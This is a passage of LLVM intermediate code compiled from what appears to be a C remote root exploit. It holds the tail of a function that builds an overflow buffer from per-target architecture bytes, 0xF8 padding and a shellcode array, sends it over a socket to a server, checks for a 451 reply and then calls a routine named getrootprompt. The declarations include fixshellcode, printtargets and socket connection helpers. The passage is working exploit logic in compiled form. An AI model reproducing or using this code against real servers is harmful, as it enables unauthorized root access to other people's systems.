  %436 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %437 = load i32, i32* %11, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %436, i64 %438
  %440 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %439, i32 0, i32 2
  %441 = bitcast i64* %440 to i8*
  %442 = getelementptr inbounds i8, i8* %441, i64 0
  %443 = load i8, i8* %442, align 8
  %444 = load i8*, i8** %15, align 8
  %445 = getelementptr inbounds i8, i8* %444, i32 1
  store i8* %445, i8** %15, align 8
  store i8 %443, i8* %444, align 1
  %446 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %447 = load i32, i32* %11, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %446, i64 %448
  %450 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %449, i32 0, i32 2
  %451 = bitcast i64* %450 to i8*
  %452 = getelementptr inbounds i8, i8* %451, i64 1
  %453 = load i8, i8* %452, align 1
  %454 = load i8*, i8** %15, align 8
  %455 = getelementptr inbounds i8, i8* %454, i32 1
  store i8* %455, i8** %15, align 8
  store i8 %453, i8* %454, align 1
  %456 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %457 = load i32, i32* %11, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %456, i64 %458
  %460 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %459, i32 0, i32 2
  %461 = bitcast i64* %460 to i8*
  %462 = getelementptr inbounds i8, i8* %461, i64 2
  %463 = load i8, i8* %462, align 2
  %464 = load i8*, i8** %15, align 8
  %465 = getelementptr inbounds i8, i8* %464, i32 1
  store i8* %465, i8** %15, align 8
  store i8 %463, i8* %464, align 1
  %466 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %467 = load i32, i32* %11, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %466, i64 %468
  %470 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %469, i32 0, i32 2
  %471 = bitcast i64* %470 to i8*
  %472 = getelementptr inbounds i8, i8* %471, i64 3
  %473 = load i8, i8* %472, align 1
  %474 = load i8*, i8** %15, align 8
  %475 = getelementptr inbounds i8, i8* %474, i32 1
  store i8* %475, i8** %15, align 8
  store i8 %473, i8* %474, align 1
  store i64 0, i64* %8, align 8
  br label %476

476:                                              ; preds = %482, %428
  %477 = load i64, i64* %8, align 8
  %478 = icmp ult i64 %477, 32
  br i1 %478, label %479, label %485

479:                                              ; preds = %476
  %480 = load i8*, i8** %15, align 8
  %481 = getelementptr inbounds i8, i8* %480, i32 1
  store i8* %481, i8** %15, align 8
  store i8 -8, i8* %480, align 1
  br label %482

482:                                              ; preds = %479
  %483 = load i64, i64* %8, align 8
  %484 = add i64 %483, 1
  store i64 %484, i64* %8, align 8
  br label %476

485:                                              ; preds = %476
  store i64 0, i64* %8, align 8
  br label %486

486:                                              ; preds = %499, %485
  %487 = load i64, i64* %8, align 8
  %488 = load i32*, i32** @code, align 8
  %489 = call i64 @strlen(i32* %488)
  %490 = icmp ult i64 %487, %489
  br i1 %490, label %491, label %502

491:                                              ; preds = %486
  %492 = load i32*, i32** @code, align 8
  %493 = load i64, i64* %8, align 8
  %494 = getelementptr inbounds i32, i32* %492, i64 %493
  %495 = load i32, i32* %494, align 4
  %496 = trunc i32 %495 to i8
  %497 = load i8*, i8** %15, align 8
  %498 = getelementptr inbounds i8, i8* %497, i32 1
  store i8* %498, i8** %15, align 8
  store i8 %496, i8* %497, align 1
  br label %499

499:                                              ; preds = %491
  %500 = load i64, i64* %8, align 8
  %501 = add i64 %500, 1
  store i64 %501, i64* %8, align 8
  br label %486

502:                                              ; preds = %486
  %503 = load i8*, i8** %15, align 8
  %504 = getelementptr inbounds i8, i8* %503, i32 1
  store i8* %504, i8** %15, align 8
  store i8 0, i8* %503, align 1
  %505 = call i32 @sprintf(i8* %21, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.17, i64 0, i64 0), i8* %24)
  %506 = load i32, i32* %10, align 4
  %507 = call i32 @writesocket(i32 %506, i8* %21)
  %508 = load i32, i32* %10, align 4
  %509 = call i32 @writesocket(i32 %508, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.18, i64 0, i64 0))
  %510 = load i64, i64* %9, align 8
  %511 = icmp ne i64 %510, 0
  br i1 %511, label %523, label %512

512:                                              ; preds = %502
  %513 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.19, i64 0, i64 0))
  %514 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.20, i64 0, i64 0))
  %515 = load i32, i32* %10, align 4
  %516 = call i64 @readutil(i32 %515, i32 451)
  %517 = icmp ne i64 %516, 0
  br i1 %517, label %518, label %520

518:                                              ; preds = %512
  %519 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0))
  br label %522

520:                                              ; preds = %512
  %521 = call i32 (...) @getrootprompt()
  br label %522

522:                                              ; preds = %520, %518
  br label %530

523:                                              ; preds = %502
  %524 = load i32, i32* %10, align 4
  %525 = call i64 @readutil(i32 %524, i32 451)
  %526 = load i32, i32* %10, align 4
  %527 = call i32 @close(i32 %526)
  %528 = load i64, i64* %9, align 8
  %529 = add i64 %528, 4
  store i64 %529, i64* %9, align 8
  br label %69

530:                                              ; preds = %522
  store i32 0, i32* %16, align 4
  br label %531

531:                                              ; preds = %530, %66, %44, %27
  %532 = load i8*, i8** %12, align 8
  call void @llvm.stackrestore(i8* %532)
  %533 = load i32, i32* %16, align 4
  switch i32 %533, label %536 [
    i32 0, label %534
    i32 1, label %534
  ]

534:                                              ; preds = %531, %531
  %535 = load i32, i32* %3, align 4
  ret i32 %535

536:                                              ; preds = %531
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @printtargets(...) #2

declare dso_local i32 @atol(i8*) #2

declare dso_local i32 @sscanf(i8*, i8*, i64*) #2

declare dso_local i32 @header(...) #2

declare dso_local i32 @fixshellcode(i8*, i32) #2

declare dso_local i32 @fork(...) #2

declare dso_local i32 @getrootprompt(...) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @htons(i32) #2

declare dso_local i64 @inet_addr(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @readsocket(i32, i32) #2

declare dso_local i32 @writesocket(i32, i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i64 @strlen(i32*) #2

declare dso_local i64 @readutil(i32, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
